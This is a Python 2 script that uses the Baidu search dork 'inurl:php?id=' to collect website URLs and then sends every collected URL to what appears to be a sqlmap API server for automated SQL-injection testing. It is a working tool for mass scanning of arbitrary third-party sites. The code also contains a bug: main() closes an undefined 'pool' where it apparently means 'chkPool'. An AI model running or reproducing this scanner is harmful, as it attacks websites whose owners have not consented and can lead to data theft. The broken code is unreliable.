#coding:utf-8
import urllib
import urllib2
import re
import time
from multiprocessing.dummy import Pool as threadPool
from autoSqli import *

searchUrl = 'http://m.baidu.com/s?tn=middle&pn=pageNum&word=keyWord'
jumpUrl = 'http://m.baidu.com/?bdenc=1&nsrc='
regex_nsrc = re.compile(r'nsrc=(.*?)"')
regex_url = re.compile(r'url=(http://.*)"')

def getBaseUrl(jUrl):
	try:
		html = urllib2.urlopen(jUrl).read()
		u = regex_url.search(html)
		if u:
			u = u.group(1).replace('amp;','')
		else:
			u = urllib2.urlopen(jUrl).geturl()
		return u
	except:
		return None


def getUrlList(sUrl,jUrl):
	#获取此sUrl中的10条nsrc记录
	html = urllib2.urlopen(sUrl).read()
	nsrcList = regex_nsrc.findall(html)
	#遍历获取到的10条nsrc记录
	jumpUrl = [jUrl+nsrc for nsrc in nsrcList]
	pool = threadPool(5)
	urlList = pool.map(getBaseUrl,jumpUrl)
	pool.close()
	pool.join()



	# for nsrc in nsrcList:
	# 	print ('.'),
	# 	#测试（jUrl+nsrc）的可访问性
	# 	#若跳转太多或访问出错
	# 	#则跳过此条（jUrl+nsrc）
	# 	html2 = getHtml(jUrl+nsrc)
	# 	if html2 == 'Error':
	# 		print html2
	# 		continue
	# 	#成功获取到跳到百度转码的网页（html2）
	# 	u = regex_url.search(html2)
	# 	if u:
	# 		urlList.append(u.group(1).replace('amp;',''))

	# 	#直接跳转到真实网页,由于不同的网站的
	# 	#网络环境不同会导致访问时间可能太长，故屏蔽
	# 	# else:
	# 	# 	u = urllib2.urlopen(jUrl+nsrc).geturl()
	# 	# 	urlList.append(u)



	#返回获取到的真实url
	return urlList

def main():
	wd = 'inurl:php?id='
	wd = urllib.quote(wd)
	ksearchUrl = searchUrl.replace('keyWord',wd)
	for n in range(6,7):
		n = n * 10
		currentSearchUrl = ksearchUrl.replace('pageNum',str(n))
		print currentSearchUrl
		urlList = getUrlList(currentSearchUrl,jumpUrl)
		autoChk = autoSqli('http://127.0.0.1:8775')
		chkPool = threadPool(3)
		rsts = chkPool.map(autoChk.run,urlList)
		pool.close()
		pool.join()
	return (0)

if __name__ == '__main__':
	start = time.time()
	main()
	print (time.time()-start)
